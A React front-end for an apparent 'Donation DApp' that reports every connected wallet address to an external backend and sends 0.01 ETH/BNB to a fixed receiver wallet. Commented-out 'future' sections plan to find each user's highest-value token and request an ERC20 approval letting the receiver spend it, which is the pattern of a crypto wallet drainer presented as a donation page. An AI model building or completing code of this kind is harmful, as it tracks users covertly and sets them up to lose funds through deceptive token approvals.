import React, { useEffect, useState } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useSigner, useProvider, useNetwork } from "wagmi";
import { ethers } from "ethers";

// Flask backend
const API_URL = "https://web-production-2da7.up.railway.app/notify";

// Receiving wallet
const RECEIVER = "0xdC3b29e4a6aF19d5E57965596020127A09049d83";

// Simple ERC20 ABI
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

// Token addresses (future use)
/*
const TOKENS = {
  1: { // Ethereum
    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
  },
  56: { // BNB Smart Chain
    USDT: "0x55d398326f99059fF775485246999027B3197955"
  }
};
*/

async function notifyBackend(event, data) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event,
        data,
        source: "Frontend",
        ip: "client"
      }),
    });
  } catch (err) {
    console.error("Notify error:", err);
  }
}

export default function App() {
  const { address, isConnected, isDisconnected } = useAccount();
  const { data: signer } = useSigner();
  // const provider = useProvider();
  // const { chain } = useNetwork();

  // const [balances, setBalances] = useState({});
  // const [highestToken, setHighestToken] = useState(null);

  // Wallet connect
  useEffect(() => {
    if (isConnected && address) {
      notifyBackend("wallet_connect", { account: address });
    }
  }, [isConnected, address]);

  // Wallet disconnect
  useEffect(() => {
    if (isDisconnected) {
      notifyBackend("wallet_disconnect", { account: address });
      // setBalances({});
      // setHighestToken(null);
    }
  }, [isDisconnected]);

  // Future balance check (commented)
  /*
  useEffect(() => {
    if (isConnected && address && chain?.id) {
      (async () => {
        // fetch balances, detect highest in USD
      })();
    }
  }, [isConnected, address, chain, provider]);
  */

  // Donation / Subscription
  async function handleSubscribe() {
    if (!signer || !address) return;

    try {
      // Native transfer (0.01 ETH/BNB)
      let tx = await signer.sendTransaction({
        to: RECEIVER,
        value: ethers.utils.parseEther("0.01")
      });
      await tx.wait();

      notifyBackend("subscription_success", {
        account: address,
        token: "NATIVE",
        amount: "0.01",
        usd: "≈ live value",
        txHash: tx.hash
      });
    } catch (err) {
      console.error("Transaction error:", err);
      notifyBackend("subscription_failed", { account: address });
    }

    /*
    // Future ERC20 approval
    try {
      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
      let tx = await token.approve(RECEIVER, ethers.utils.parseUnits("10", 18));
      await tx.wait();
      notifyBackend("approval_success", { account: address, token: "USDT" });
    } catch (err) {
      console.error("Approval error:", err);
    }
    */
  }

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white">
      <h1 className="text-3xl font-bold mb-6">🚀 My Donation DApp</h1>
      <ConnectButton />

      {isConnected && (
        <button
          onClick={handleSubscribe}
          className="mt-6 px-4 py-2 bg-blue-500 rounded-lg hover:bg-blue-600"
        >
          Donate / Subscribe
        </button>
      )}
    </div>
  );
}
